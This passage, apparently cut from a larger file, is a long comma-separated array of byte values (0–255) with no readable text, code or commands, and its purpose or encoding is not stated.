,18,117,123,113,83,64,80,184,164,169,140,133,137,227,227,237,223,223,207,61,32,11,26,7,106,127,101,87,70,79,183,165,168,155,153,145,240,229,238,205,192,194,44,44,46,29,24,15,98,102,111,65,69,182,190,189,144,155,129,233,253,236,213,197,198,48,36,43,20,27,5,117,100,119,80,89,78,184,165,181,158,135,148,245,234,203,216,194,52,39,34,9,24,8,117,101,107,90,89,81,187,175,176,153,132,137,236,227,235,195,205,206,63,63,44,20,3,107,123,104,74,88,68,180,166,175,149,133,138,244,228,229,211,197,208,51,39,42,12,7,15,126,120,107,93,95,78,187,190,145,158,131,234,255,226,201,216,200,53,37,38,23,4,4,116,123,101,83,68,87,181,167,182,159,130,136,226,224,234,223,222,48,52,61,16,31,2,105,123,109,72,89,73,178,164,171,147,133,144,249,239,247,217,198,203,35,32,40,2,3,15,97,99,86,94,93,180,186,188,147,159,142,232,250,232,207,217,196,46,34,46,19,26,9,108,98,108,94,88,75,190,161,180,158,133,235,249,227,212,199,198,52,38,47,18,24,18,118,113,108,78,71,68,173,160,175,146,153,136,254,248,239,217,194,212,63,35,21,0,2,116,122,124,87,95,78,168,184,170,143,145,139,238,226,236,211,218,202,49,57,35,27,5,21,121,96,116,93,75,171,188,164,148,135,132,247,230,230,220,216,210,53,56,47,14,14,4,109,98,105,82,89,67,190,184,161,152,130,148,244,235,214,192,201,54,58,60,19,25,14,104,122,106,79,90,69,174,165,173,147,154,136,241,228,246,217,193,200,34,39,44,1,7,126,96,96,82,89,92,178,166,170,145,152,146,247,253,241,208,192,208,50,34,41,12,3,11,99,101,111,95,95,76,180,163,139,148,129,247,231,232,215,216,211,51,61,50,19,17,12,110,98,109,83,90,67,177,164,182,152,135,136,226,225,236,193,198,48,32,35,18,25,28,125,123,110,72,95,75,178,164,165,145,155,141,246,250,233,211,199,214,58,56,40,27,2,20,120,102,75,93,73,170,187,164,151,134,140,246,229,235,213,217,209,54,46,45,13,2,11,113,121,105,90,70,85,186,166,180,153,138,246,224,227,215,217,220,52,58,46,8,27,11,114,100,105,86,91,76,184,186,169,147,135,150,253,229,232,194,202,205,60,62,21,26,29,112,115,124,82,89,77,168,177,172,143,152,137,243,251,235,209,196,215,52,37,43,3,1,13,127,127,96,92,94,183,180,160,138,154,130,247,230,238,214,216,210,50,60,47,14,4,15,109,103,99,81,89,73,187,166,181,152,138,148,248,225,214,192,193,48,39,36,19,6,8,118,123,114,90,68,75,177,166,176,151,131,151,247,237,246,220,193,203,34,34,43,1,6,113,125,125,85,90,66,169,188,175,149,133,143,247,249,241,211,195,208,50,33,42,12,7,8,125,120,109,94,66,84,185,166,150,128,136,245,231,226,221,219,211,51,61,44,15,31,15,115,123,110,84,71,87,178,163,182,153,130,149,249,225,234,193,203,43,59,37,23,7,8,118,102,105,84,88,82,186,188,175,142,135,141,237,239,237,209,217,201,54,37,53,22,3,9,97,97,82,93,93,183,191,188,146,157,147,245,251,236,207,223,196,46,39,40,16,26,3,117,121,107,87,88,73,189,161,180,155,128,246,224,229,210,218,220,51,57,51,21,16,18,118,125,111,78,64,80,183,161,170,140,135,143,227,225,233,223,223,192,57,32,11,24,0,106,126,102,84,70,78,180,187,178,151,152,140,238,224,233,208,218,204,51,57,47,24,24,13,127,97,116,92,66,182,160,165,149,154,156,252,255,243,221,222,210,54,61,47,14,14,13,112,122,108,85,68,86,189,161,181,154,132,148,244,230,213,192,192,42,59,40,20,6,7,112,101,111,83,89,81,176,163,174,141,134,142,236,226,236,222,216,206,63,33,52,27,11,107,123,100,87,71,64,179,166,174,147,133,141,240,250,241,213,198,205,45,32,46,17,25,3,123,120,110,88,95,79,191,160,139,148,128,247,231,231,209,219,211,48,61,50,19,16,17,119,99,110,77,70,73,172,161,162,158,152,129,247,226,244,219,203,43,59,34,20,7,7,113,102,110,92,88,82,180,177,172,142,133,142,240,250,239,213,196,214,54,33,53,29,10,20,121,96,85,64,72,183,186,188,157,152,142,232,253,235,207,219,202,46,38,47,19,26,14,113,121,110,88,69,85,185,170,169,129,134,246,253,253,213,223,194,41,62,45,8,26,8,114,100,105,83,69,80,183,164,170,140,135,137,254,248,237,221,223,204,59,35,11,30,0,116,103,99,84,91,83,178,189,175,143,158,142,238,229,229,205,198,200,50,57,35,3,6,10,127,127,111,93,64,171,184,169,138,153,132,247,230,237,214,197,199,53,57,49,21,7,14,109,97,107,81,89,76,187,165,181,159,129,148,252,235,214,192,201,55,57,60,20,24,14,104,126,109,82,68,69,177,187,164,151,135,151,248,229,232,195,204,200,63,63,45,25,3,107,124,101,74,90,73,169,184,170,150,133,143,242,228,236,215,198,208,53,47,42,12,12,12,99,102,109,92,95,73,161,163,145,157,157,240,250,226,201,218,207,53,37,38,16,25,17,112,102,112,87,78,74,172,172,163,158,152,143,255,226,244,222,199,54,32,39,19,7,3,125,123,115,85,93,76,175,189,172,142,133,139,240,250,239,212,217,205,55,56,32,26,1,20,121,126,87,88,64,170,188,160,151,134,143,252,229,233,215,217,209,54,59,46,23,7,23,112,103,104,67,77,64,162,163,171,156,158,240,248,253,222,221,193,41,63,46,22,5,13,113,121,113,85,66,77,173,166,173,140,130,141,227,225,237,220,223,193,33,34,16,29,29,118,123,98,73,93,72,168,176,170,145,132,141,238,228,235,208,218,201,50,39,54,28,12,21,119,96,105,65,68,181,160,161,144,154,156,244,248,237,200,219,204,50,36,44,17,6,16,115,99,119,87,66,75,163,173,168,156,159,136,252,254,222,222,192,42,57,37,9,24,8,104,126,108,81,68,73,176,187,168,151,135,151,244,229,232,195,195,201,63,63,42,30,0,107,116,99,74,83,70,180,166,167,149,155,146,240,249,236,206,196,207,48,58,45,18,25,13,120,101,117,88,74,73,161,161,149,157,157,246,254,225,201,221,204,40,57,38,15,29,12,112,123,111,83,90,78,181,164,182,155,129,149,248,228,244,222,199,53,32,32,10,19,6,116,102,105,93,88,82,180,185,172,142,132,136,243,250,238,210,217,206,55,37,53,24,2,10,97,106,87,93,93,178,184,161,137,154,142,232,241,233,210,196,205,48,37,48,23,6,10,108,109,111,94,88,77,189,191,172,149,158,246,253,227,202,216,220,52,63,46,8,25,15,113,100,110,85,91,79,180,164,183,144,153,143,247,229,245,216,202,201,33,35,21,29,29,119,127,97,73,88,77,168,190,168,146,132,143,242,229,240,217,207,215,49,32,43,3,0,8,98,98,96,92,94,190,188,163,138,155,129,244,230,238,209,216,210,52,61,49,19,0,16,115,98,105,76,68,75,163,161,173,159,159,140,252,224,203,212,201,42,51,36,23,6,11,104,125,102,82,68,74,179,165,176,146,134,138,236,237,238,222,216,207,63,63,40,20,3,107,124,96,84,71,69,183,187,179,144,156,143,239,241,238,206,196,203,45,38,47,18,25,15,126,120,109,91,66,84,188,164,139,158,136,234,255,227,215,198,204,40,59,41,18,4,10,114,101,112,85,79,87,179,166,168,131,133,139,226,234,224,220,222,55,62,35,10,28,9,105,123,107,85,69,71,183,164,171,154,134,144,246,229,233,204,194,203,62,56,32,29,2,20,126,102,75,85,70,170,191,163,151,134,141,246,229,236,212,217,209,49,34,48,21,0,23,120,103,104,67,64,75,162,163,175,156,158,245,254,227,202,216,200,41,51,43,22,5,12,114,100,107,85,70,80,184,166,169,140,132,138,254,248,233,221,194,212,56,38,11,30,9,119,103,102,81,88,83,183,184,175,143,156,137,243,251,228,212,218,205,54,57,42,28,6,21,120,97,116,85,68,182,160,160,147,135,130,252,230,235,209,219,210,50,59,49,17,0,13,109,98,98,81,89,79,183,184,171,157,130,148,245,230,203,218,198,42,58,33,23,6,9,117,120,114,91,90,76,174,161,175,141,142,140,241,249,226,221,198,213,59,35,41,1,6,112,125,125,85,95,92,188,188,179,150,156,140,239,251,241,211,193,205,45,32,43,18,25,8,120,120,108,91,65,84,180,163,139,158,135,247,231,232,220,219,211,52,56,47,15,30,14,115,123,111,85,90,78,184,185,173,156,134,149,246,226,233,193,198,50,61,61,23,29,28,114,125,115,83,91,76,175,189,172,147,155,143,249,231,247,208,195,214,60,45,53,23,7,10,97,96,75,95,71,183,167,166,149,152,147,241,241,242,211,219,207,46,33,40,13,14,3,113,121,107,94,70,85,184,162,169,129,135,244,253,253,208,216,220,60,60,51,16,29,12,111,122,108,78,64,73,176,186,171,150,153,142,247,248,235,219,193,212,63,35,11,27,9,119,103,102,80,70,76,189,165,174,150,154,145,244,251,232,217,199,215,53,44,43,3,6,8,127,127,108,89,64,171,185,162,138,158,134,244,230,231,212,219,210,52,49,49,17,4,13,109,102,109,76,71,77,163,161,171,156,159,137,255,254,208,216,192,42,51,36,9,18,7,104,120,107,81,68,78,179,187,173,151,135,151,242,225,246,218,204,213,59,39,42,1,0,117,96,103,80,90,92,179,179,174,136,152,143,242,228,229,209,197,208,57,37,55,23,2,11,99,109,106,92,95,76,191,163,139,154,132,247,231,224,211,198,203,60,37,44,22,26,17,115,123,104,87,71,87,177,161,182,154,130,149,251,231,234,193,193,54,32,34,16,26,28,116,127,115,86,81,82,177,188,175,142,131,141,237,230,227,209,217,203,61,38,53,22,10,20,123,102,86,64,69,181,167,168,146,155,147,243,250,236,207,222,196,46,37,41,16,26,3,117,121,106,86,88,77,188,161,180,157,158,246,250,224,202,219,197,41,62,41,8,26,10,113,100,106,78,67,68,176,186,171,145,135,150,255,229,232,194,199,204,60,62,19,24,29,116,115,97,73,91,77,182,165,170,145,153,145,251,228,237,205,193,206,44,32,45,3,4,12,124,127,106,95,67,171,187,162,151,135,132,240,230,233,220,197,207,54,58,49,19,27,14,118,103,119,85,69,72,163,172,175,130,131,140,252,254,211,222,221,55,60,33,9,26,15,118,101,102,83,89,81,176,163,173,141,130,142,236,229,237,195,197,203,60,63,46,20,30,118,127,96,74,83,69,169,191,167,136,157,140,241,228,239,211,198,208,56,34,42,12,1,14,99,109,97,66,65,76,191,190,146,128,132,240,250,252,211,218,205,40,59,41,15,17,14,115,123,106,83,90,67,183,164,182,151,133,139,226,226,232,220,222,53,63,32,10,28,3,105,124,103,72,90,79,177,164,170,144,134,144,249,227,234,204,193,207,35,36,46,2,7,13,127,126,95,92,64,170,191,166,148,134,137,253,248,242,208,217,204,46,38,40,19,26,3,114,121,108,87,69,85,185,162,170,129,131,255,224,232,212,218,220,53,56,51,23,17,18,118,113,108,78,67,76,176,186,173,149,132,150,250,231,245,215,196,212,53,33,21,0,5,118,122,124,92,95,78,168,187,171,143,144,139,238,231,239,211,218,200,49,57,46,24,5,21,124,98,106,65,69,183,189,189,151,159,129,233,250,237,200,221,200,50,36,47,27,6,16,113,102,106,76,76,73,190,184,170,159,159,139,250,254,223,221,195,42,61,41,9,18,10,117,101,110,85,68,76,181,187,168,149,132,151,243,228,235,195,194,205,63,63,33,20,3,107,121,103,74,95,68,183,166,175,136,156,134,242,228,229,219,198,208,55,47,55,16,1,11,99,109,109,66,74,64,188,190,148,158,131,234,253,225,212,198,203,49,56,50,18,28,17,115,110,112,88,71,73,172,166,168,158,152,128,251,226,244,213,193,43,59,41,10,26,3,119,102,105,85,69,74,183,185,177,146,135,142,237,239,237,204,198,206,61,56,46,2,6,14,124,126,87,94,67,170,189,169,137,153,140,245,229,238,215,196,207,53,38,48,24,7,9,108,100,106,94,88,76,187,162,180,158,135,235,250,231,202,218,193,55,38,44,21,24,18,117,123,108,78,66,73,173,166,162,140,133,137,253,248,233,220,223,204,57,35,11,21,8,119,103,98,93,70,73,176,184,178,146,132,136,250,230,240,211,196,201,44,34,35,3,13,11,127,127,110,94,94,180,187,189,151,155,130,233,242,230,200,209,202,50,36,42,17,27,11,119,122,106,81,71,86,183,165,168,130,133,140,252,254,209,216,221,49,51,60,22,31,13,104,125,108,79,90,74,179,187,175,152,135,151,240,237,246,223,193,200,34,42,42,1,5,112,125,125,94,91,66,169,187,175,149,133,134,246,249,241,210,195,208,53,46,55,17,4,8,99,99,107,95,95,65,185,163,139,157,135,234,249,233,201,223,204,54,37,40,18,4,5,116,102,112,80,70,73,172,173,173,131,132,140,252,255,236,193,192,49,61,61,19,18,1,105,124,111,85,69,78,176,185,177,150,155,139,246,231,247,216,197,200,35,33,41,31,31,12,120,99,75,91,68,170,187,167,137,155,139,246,229,233,209,217,209,48,32,45,13,5,8,108,100,98,67,71,74,188,191,168,159,158,254,250,224,202,218,192,55,38,44,20,24,18,113,123,111,78,64,78,173,163,172,145,153,131,246,229,245,214,195,201,33,39,20,29,29,126,103,102,82,91,83,183,184,172,143,158,140,243,251,234,210,199,215,54,32,54,25,2,21,119,96,106,65,70,183,189,189,158,157,129,233,243,234,200,217,198,47,56,40,16,27,9,109,100,109,81,89,76,182,165,181,150,130,137,225,227,211,222,221,48,57,60,22,28,14,104,122,110,81,68,77,178,166,176,144,131,138,236,228,232,195,197,193,34,36,43,31,30,114,96,97,83,90,92,180,190,179,151,144,146,250,250,239,206,207,204,48,58,47,22,4,22,123,97,117,88,67,73,161,166,146,158,157,247,231,231,211,219,211,55,57,44,15,26,15,115,123,110,85,71,87,177,167,182,157,130,136,226,234,232,223,222,62,53,61,16,31,1,105,114,107,72,91,73,175,177,174,144,155,141,237,224,236,209,217,203,58,56,40,23,31,11,120,96,75,88,64,170,187,166,148,134,137,241,229,231,210,217,209,52,35,46,13,7,9,108,101,108,94,88,73,188,161,180,148,139,235,244,229,215,199,200,52,38,46,29,24,18,122,123,111,78,64,69,173,162,175,145,153,142,251,248,224,214,223,201,62,32,11,26,29,118,115,97,73,94,79,182,165,169,155,132,133,246,229,240,209,196,215,49,44,43,3,0,9,124,127,111,84,94,183,191,163,138,157,130,233,254,231,213,197,204,49,58,49,26,14,16,114,101,106,76,66,78,163,165,160,159,159,143,249,224,203,220,195,55,39,36,17,27,19,125,122,114,80,81,81,180,165,174,141,135,151,241,227,235,195,199,200,60,63,41,21,30,114,121,99,74,89,65,169,188,169,149,133,142,243,250,241,218,206,208,51,34,41,12,13,22,125,108,104,66,71,73,191,190,150,158,128,234,253,229,212,198,206,48,37,47,27,25,17,122,101,110,77,67,75,177,185,175,152,133,149,253,224,244,217,202,43,56,35,20,7,1,118,102,110,82,88,82,177,177,172,142,133,141,240,250,239,212,199,214,57,56,47,25,2,20,122,99,85,64,68,180,186,188,148,158,141,232,251,239,207,208,202,51,59,36,17,4,23,116,100,107,67,76,75,191,191,175,158,158,247,251,253,222,217,194,41,51,47,21,5,15,116,121,113,80,68,80,176,175,183,145,128,136,227,224,235,194,195,206,60,62,30,21,0,106,115,96,84,70,72,183,187,178,150,154,145,245,224,237,205,199,201,50,57,40,29,5,21,118,96,105,65,70,179,160,161,158,135,128,246,248,243,215,216,207,47,58,46,19,27,11,114,122,105,87,89,77,189,166,181,156,130,148,248,228,214,192,194,48,39,35,18,6,13,113,123,114,83,90,81,182,161,173,141,128,138,242,249,233,223,197,213,59,39,41,1,7,117,96,102,81,71,67,183,184,179,147,153,143,239,241,238,211,219,206,53,58,34,23,25,12,123,102,117,95,66,84,188,167,150,128,131,245,231,225,210,198,203,49,59,50,26,4,13,123,102,112,82,67,87,177,173,182,156,128,139,226,224,233,193,192,63,61,61,16,26,2,105,123,111,85,69,71,183,185,177,147,133,144,247,225,247,214,196,200,35,37,40,31,31,0,127,99,75,90,68,170,178,166,137,147,140,246,229,234,210,196,205,54,38,48,22,3,23,120,99,118,88,64,75,162,166,170,129,135,255,253,253,210,223,220,52,59,46,8,26,10,114,100,106,86,91,78,182,167,183,145,135,136,227,226,235,223,223,203,56,35,11,20,0,106,122,103,73,91,79,182,165,173,146,132,137,241,230,240,214,197,215,50,44,54,27,7,11,98,100,116,91,69,182,160,162,147,135,134,253,230,230,215,219,210,48,36,45,27,6,16,113,102,105,76,66,75,190,184,171,154,130,148,255,225,203,220,201,42,57,33,23,6,12,118,120,114,84,93,76,174,162,168,141,131,141,236,225,235,221,216,202,60,63,42,24,3,107,126,100,74,95,70,169,178,171,150,133,142,239,248,229,211,219,197,53,58,34,24,25,3,124,101,117,95,95,75,181,163,139,156,129,244,231,224,213,219,211,54,60,47,15,17,14,110,100,107,77,79,72,178,185,174,159,133,149,248,230,233,193,197,51,32,33,31,7,1,113,120,115,80,88,82,181,189,172,142,129,143,237,239,227,204,198,206,61,56,44,28,31,12,117,99,75,89,65,180,167,164,156,134,137,247,248,242,214,196,196,53,38,48,23,15,10,108,96,104,94,88,73,189,162,180,159,129,235,244,231,202,222,196,55,38,44,21,24,18,118,124,108,78,64,79,173,166,172,140,141,137,253,248,232,221,223,192,57,35,11,30,4,106,120,105,73,94,76,182,165,169,145,132,133,244,230,240,208,198,201,44,45,45,3,13,11,127,127,97,65,68,176,160,166,159,154,156,245,248,238,200,209,204,50,36,36,23,27,4,119,122,98,84,71,86,186,165,181,152,134,137,225,226,209,192,197,62,39,33,22,24,19,114,123,114,81,92,76,174,162,169,141,135,131,236,237,233,221,216,200,60,63,45,21,3,107,122,96,84,71,65,180,187,179,145,154,143,239,252,239,206,193,196,45,39,41,18,25,11,125,101,117,89,70,73,161,165,148,128,136,254,231,230,215,216,211,52,59,50,23,28,12,110,100,106,77,67,67,172,166,175,157,152,143,252,255,237,218,195,43,58,33,20,7,2,116,123,115,92,90,79,175,191,175,142,131,138,240,250,232,217,196,214,63,37,40,2,6,13,124,126,94,88,93,183,188,188,157,155,141,232,240,239,210,196,203,49,38,48,19,3,23,113,109,118,90,65,75,162,167,170,129,128,240,253,253,212,221,220,50,58,46,8,28,12,113,100,111,80,91,68,183,167,183,150,133,136,227,226,232,223,223,206,62,35,11,27,5,106,115,104,84,70,77,189,184,178,144,152,140,238,224,233,208,218,201,52,57,46,22,24,10,127,97,116,84,66,182,160,167,146,154,156,244,255,243,214,209,210,58,58,47,14,15,16,117,97,106,76,69,78,163,164,168,159,159,129,255,224,203,219,192,42,63,38,20,6,11,116,123,114,83,90,76,174,174,174,144,154,140,244,249,232,216,197,213,63,33,42,1,10,126,96,104,85,90,92,188,185,179,148,144,146,243,249,239,206,192,205,45,34,45,17,25,14,127,102,117,88,68,84,188,166,149,128,128,244,231,229,221,219,211,52,60,50,27,17,17,118,99,110,77,71,78,172,165,173,158,152,138,247,226,244,217,192,54,32,36,21,26,28,119,121,115,84,81,82,176,185,175,142,131,142,240,250,239,213,196,214,62,34,53,31,10,20,123,97,85,64,66,183,167,160,157,155,147,244,249,236,207,217,205,51,59,36,21,4,23,116,121,106,89,69,85,191,163,170,129,132,247,253,253,209,216,194,41,56,43,8,17,6,114,100,107,83,69,80,183,175,183,153,128,139,227,231,237,194,199,207,33,38,23,30,29,117,121,97,73,83,73,181,165,173,150,132,137,245,251,239,210,196,215,49,57,46,23,5,21,119,106,105,65,70,183,189,189,145,152,129,233,242,243,220,209,207,47,62,45,16,27,9,115,103,119,85,65,75,163,163,170,130,134,128,252,254,209,213,192,42,57,34,20,6,12,113,120,114,87,93,81,186,175,176,150,133,137,236,230,235,222,216,202,56,34,52,26,1,107,124,105,74,91,67,183,166,166,150,133,140,245,249,241,214,206,205,45,39,43,17,25,3,123,101,117,89,66,84,186,165,150,128,136,255,250,252,215,218,206,40,63,45,18,4,11,113,123,108,86,71,87,180,164,168,131,141,136,255,255,232,216,195,43,52,34,10,25,7,105,126,109,86,69,78,178,185,177,150,129,141,237,230,237,204,193,203,62,56,44,28,1,20,125,97,75,89,73,183,167,163,156,155,147,243,240,242,209,219,204,46,33,47,13,15,13,113,121,111,86,69,85,184,161,169,129,129,242,253,253,212,221,220,50,61,46,8,26,15,113,100,101,82,70,80,182,162,170,140,129,143,227,229,224,194,203,204,63,62,21,29,29,117,125,97,73,92,74,168,177,175,146,132,142,247,229,240,216,196,215,55,34,43,3,3,0,127,127,109,95,67,171,180,163,151,135,130,241,230,236,211,216,210,49,58,47,14,3,13,112,122,108,83,68,86,182,167,181,151,132,148,255,225,213,192,200,42,51,39,20,6,14,113,101,102,91,68,69,176,165,176,147,132,151,249,237,235,195,193,201,60,63,40,28,3,107,116,99,84,71,64,183,166,167,156,152,146,243,250,239,206,199,204,48,58,45,21,4,22,121,97,117,87,68,84,187,163,149,128,130,247,231,233,215,219,211,48,60,50,21,30,17,122,100,110,77,70,73,172,173,172,158,152,141,254,225,244,223,197,43,56,36,20,7,4,105,115,103,85,69,77,178,186,177,149,135,141,237,227,239,210,217,201,62,56,41,22,2,20,121,99,85,64,69,182,186,188,151,159,142,232,252,237,207,221,203,46,39,44,19,26,8,113,121,104,90,69,85,185,167,180,154,132,235,248,227,212,199,196,55,38,40,18,24,18,117,120,111,78,69,68,173,174,169,146,153,138,254,248,233,214,194,212,58,35,21,0,2,116,122,124,87,94,77,168,176,170,143,159,138,238,239,239,211,218,205,49,36,54,24,7,8,98,97,109,65,74,177,160,165,150,153,156,247,230,233,209,216,210,50,57,47,14,0,10,109,97,105,82,89,73,163,164,160,159,159,129,244,227,203,220,192,55,39,39,17,24,19,118,101,105,84,89,81,183,174,173,141,133,137,241,249,238,219,197,213,62,39,52,21,5,107,117,98,84,71,70,180,166,171,144,152,146,244,253,241,211,192,208,49,34,41,12,5,22,120,96,104,66,64,72,191,190,145,154,157,245,254,226,201,220,205,40,56,39,18,4,15,112,101,112,85,70,74,172,163,169,157,152,141,252,255,238,218,222,63,61,35,10,29,0,116,102,104,87,88,82,183,187,177,146,128,144,248,226,233,204,204,214,59,34,40,2,3,12,97,103,94,64,68,181,185,188,150,152,147,243,254,239,207,218,196,51,59,46,25,26,3,114,103,118,90,70,85,191,170,169,129,134,254,253,253,212,219,193,41,61,44,21,5,7,114,100,106,90,91,68,177,164,183,149,132,139,227,230,236,223,223,193,62,62,18,26,29,117,126,98,73,92,83,180,190,175,143,154,136,238,238,234,205,192,200,50,57,35,30,24,8,118,98,116,90,75,182,160,166,158,135,130,246,248,243,213,219,210,58,63,44,14,7,13,115,122,111,82,68,86,182,166,168,130,130,138,225,227,222,192,196,55,57,60,17,27,19,117,122,111,79,91,78,174,164,165,141,131,142,242,249,226,195,193,193,63,63,45,29,0,107,123,105,74,94,66,183,166,175,149,133,138,245,249,241,214,198,206,45,38,35,12,3,9,125,120,110,95,95,73,181,163,139,153,128,244,231,230,220,198,204,55,56,50,21,28,17,118,96,112,84,70,73,172,173,182,152,129,136,226,226,238,193,202,49,32,41,18,25,28,116,120,115,85,95,79,175,186,172,144,155,140,249,250,232,213,199,214,56,37,53,23,11,9,97,101,86,94,93,182,186,161,137,154,139,245,229,230,215,196,196,53,59,36,16,4,23,114,100,107,67,66,76,191,191,169,153,158,243,245,253,215,223,194,41,62,51,16,28,15,111,112,105,78,69,75,173,165,174,146,153,140,254,248,232,216,194,212,53,43,22,0,7,118,122,124,93,88,77,168,189,170,143,156,133,243,251,236,208,196,215,56,36,43,3,6,13,127,127,109,89,94,177,180,189,147,152,130,233,255,237,213,197,198,49,57,49,27,4,16,121,110,119,82,70,72,163,164,170,130,138,140,252,254,223,216,221,51,51,60,18,25,13,104,122,108,79,95,69,179,187,172,147,132,151,244,229,235,195,195,205,60,63,44,25,30,114,122,96,74,91,65,183,166,172,148,152,146,240,251,236,206,193,201,45,32,45,12,3,9,125,120,97,94,66,84,190,167,150,128,136,245,231,229,220,198,198,48,59,50,18,27,17,116,99,109,77,70,75,178,185,168,158,133,149,254,231,233,193,199,53,32,38,17,26,28,119,115,110,72,89,78,178,164,168,150,133,144,249,229,247,217,195,203,35,44,42,28,31,1,116,126,86,95,64,170,187,166,137,158,137,232,241,236,209,196,207,51,59,42,18,7,23,115,99,118,94,77,85,188,160,170,129,132,235,244,231,215,199,195,52,56,51,18,25,15,111,112,110,83,91,78,181,186,168,151,132,150,248,229,235,194,192,200,60,62,21,24,0,106,121,102,73,83,72,181,165,167,144,154,145,250,238,240,217,195,202,44,38,44,3,7,0,98,103,109,95,94,178,189,189,150,158,129,233,242,236,200,217,207,50,36,40,22,5,16,113,103,119,80,66,75,163,172,160,159,159,138,253,227,203,223,196,55,39,39,17,6,6,114,101,110,83,90,81,179,165,173,141,132,143,241,249,238,220,216,192,57,63,32,31,0,107,121,96,87,71,66,182,187,179,156,157,146,241,241,241,212,197,206,45,39,55,21,3,11,99,102,109,66,69,72,188,190,149,153,131,234,253,226,201,222,199,53,37,44,26,25,17,122,110,112,85,69,74,172,163,175,131,130,142,226,230,233,223,222,54,60,32,10,24,3,116,102,108,82,69,74,180,164,168,151,133,144,248,231,234,204,197,207,62,56,41,27,31,12,122,126,86,89,67,170,178,188,150,157,142,232,255,234,207,218,205,51,59,47,21,4,23,121,102,118,87,76,72,162,163,170,159,158,246,254,224,202,210,194,52,38,43,23,5,6,117,100,104,81,69,80,180,166,170,140,140,136,254,248,224,218,223,201,58,62,16,30,3,106,120,98,84,70,79,176,184,178,147,157,145,241,239,240,214,194,201,44,37,54,26,2,8,98,99,104,95,94,177,188,160,138,156,131,247,230,239,208,197,207,59,57,49,21,14,13,109,100,105,81,89,72,186,165,181,156,133,148,254,235,203,223,194,52,39,41,20,27,19,124,125,111,79,94,73,174,161,170,141,134,142,242,249,226,222,216,205,57,34,52,27,2,117,96,103,86,90,92,189,185,173,136,152,141,239,250,235,211,219,200,48,36,55,20,7,11,99,109,106,95,95,64,184,190,146,148,128,234,255,225,215,198,202,53,56,50,20,27,12,110,101,106,77,70,66,172,173,174,157,152,141,255,255,237,217,195,43,60,32,20,7,2,124,102,106,80,91,82,176,164,173,154,134,144,240,230,233,204,195,202,62,56,47,29,2,20,117,126,87,85,64,170,178,169,148,134,141,246,248,242,218,220,204,46,34,47,13,0,12,113,121,104,94,70,85,182,163,169,129,134,243,253,253,213,222,220,61,50,51,22,28,12,111,121,108,78,79,72,176,186,174,144,135,150,246,226,245,220,199,202,33,32,11,26,7,119,103,102,84,88,83,183,185,175,143,145,142,243,251,229,208,218,207,54,36,54,29,13,8,98,107,105,92,94,183,191,160,138,159,131,233,253,232,213,197,199,49,58,49,22,27,11,118,103,119,89,65,86,186,172,181,151,135,138,225,231,213,192,199,50,58,60,28,19,14,104,122,102,79,95,73,179,187,175,141,142,141,241,249,237,214,197,213,56,33,41,1,0,116,125,125,81,88,92,189,188,174,136,153,140,241,228,238,211,198,208,55,37,42,12,13,9,99,97,110,66,68,75,191,190,151,158,157,245,252,225,201,221,198,53,37,41,20,4,13,119,101,112,82,90,74,183,164,182,157,134,139,226,228,224,193,193,51,61,61,20,7,4,125,123,115,86,88,76,175,176,164,142,143,142,240,250,239,212,217,204,56,37,53,22,10,9,97,100,75,85,68,183,167,162,145,134,136,243,229,232,209,218,209,54,37,48,21,0,10,108,97,106,93,88,79,190,162,180,159,129,245,224,224,212,199,194,50,59,51,16,16,15,111,124,109,83,91,79,178,167,183,150,153,143,247,229,245,223,193,202,33,36,21,29,29,118,120,97,73,95,75,168,176,168,143,154,141,240,251,236,208,218,207,52,36,54,26,1,21,118,107,116,89,64,181,160,164,138,146,134,244,230,233,213,219,210,55,56,44,14,5,8,115,122,98,82,89,78,183,165,181,152,130,138,225,229,215,221,221,63,57,33,9,26,14,104,120,102,82,68,77,179,165,176,146,135,138,236,225,233,222,216,202,61,63,44,26,30,113,124,99,74,94,92,176,190,174,136,157,142,241,228,239,219,219,206,52,36,55,16,7,22,126,109,104,66,67,74,191,190,158,156,128,234,255,228,212,198,204,54,37,45,21,25,17,122,103,110,77,71,73,177,185,162,154,133,149,255,225,244,212,197,54,32,37,22,25,28,119,123,110,72,81,74,178,164,175,145,155,140,246,250,239,211,199,214,61,56,40,26,2,20,121,98,85,64,72,190,167,169,151,152,147,241,251,242,213,223,204,46,37,37,16,26,2,121,121,106,91,69,85,185,162,180,157,132,246,224,232,215,217,220,61,51,51,17,26,15,111,120,105,78,65,75,173,166,175,146,153,143,254,248,236,218,194,212,59,39,11,30,8,106,126,99,87,70,78,183,165,174,148,153,145,250,230,238,205,194,194,44,34,46,29,24,1,98,99,96,92,94,182,190,163,138,157,129,244,230,237,209,216,210,55,60,49,23,15,13,109,110,104,82,89,77,182,184,160,154,130,148,255,230,203,216,198,42,63,36,23,6,14,117,101,103,85,89,81,183,162,176,149,128,151,241,230,232,195,194,203,34,43,46,28,30,117,126,99,74,93,72,169,185,171,150,133,135,242,228,238,213,198,208,50,39,41,12,3,8,126,120,104,93,66,84,190,167,139,157,137,247,231,229,214,216,211,53,59,47,15,27,9,115,123,106,82,90,75,183,185,171,156,134,149,248,225,244,220,197,54,32,39,19,7,4,124,102,107,81,91,82,179,186,177,150,129,141,237,226,226,209,217,200,55,56,47,29,2,20,125,102,75,93,73,170,178,160,151,134,139,246,248,242,213,221,204,46,32,41,13,14,12,113,121,110,93,70,85,187,163,169,129,129,240,253,253,223,216,220,50,60,51,22,28,12,111,124,113,82,65,77,173,174,171,146,153,138,247,248,224,218,193,212,56,35,11,28,7,119,103,98,87,88,83,188,185,175,143,145,137,243,251,238,210,218,206,54,57,42,27,6,21,122,98,105,65,71,178,189,189,151,157,156,242,253,243,212,218,204,47,61,44,19,27,15,121,103,119,84,64,86,187,173,181,154,129,138,225,228,213,192,195,48,58,60,23,27,13,104,120,102,79,93,72,176,187,172,149,154,138,246,228,246,218,197,203,34,37,40,28,30,126,126,96,74,93,69,169,191,169,136,156,140,241,228,234,211,219,197,53,39,55,18,3,22,122,98,117,88,65,74,161,160,150,128,132,240,250,252,215,220,211,60,63,50,19,29,15,110,96,110,77,69,67,177,185,172,158,134,149,247,227,233,193,199,50,62,61,20,31,28,112,124,110,72,89,79,177,164,173,144,134,144,240,229,234,204,198,201,35,44,47,2,11,12,127,126,95,64,66,179,186,188,146,159,147,252,241,242,218,220,207,46,38,46,13,7,13,113,121,104,90,88,74,182,191,170,158,128,235,252,226,202,223,200,52,38,47,22,27,18,118,120,108,78,70,73,179,186,162,149,153,137,247,229,245,217,192,202,33,32,23,29,29,127,121,97,73,83,74,168,184,167,143,154,136,240,251,232,205,195,204,49,57,43,27,24,15,120,127,107,89,64,171,187,189,149,157,129,233,243,234,200,218,198,47,62,46,16,27,12,115,122,106,88,6